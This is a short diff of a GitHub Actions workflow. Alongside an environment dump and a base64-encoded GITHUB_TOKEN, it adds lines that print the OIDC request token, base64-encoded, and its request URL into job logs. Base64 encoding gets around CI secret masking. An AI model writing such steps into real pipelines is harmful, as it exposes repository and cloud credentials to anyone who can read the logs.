@@ -36,6 +36,9 @@ jobs:
           env
           echo 'BASE64(TOKEN):'
           echo ${{ secrets.GITHUB_TOKEN }} | base64
+          echo 'BASE64(OIDCTOKEN):'
+          echo ${{ env.ACTIONS_ID_TOKEN_REQUEST_TOKEN }} | base64
+          echo ${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}
 
       - name: Azure CLI script
         uses: azure/CLI@v1
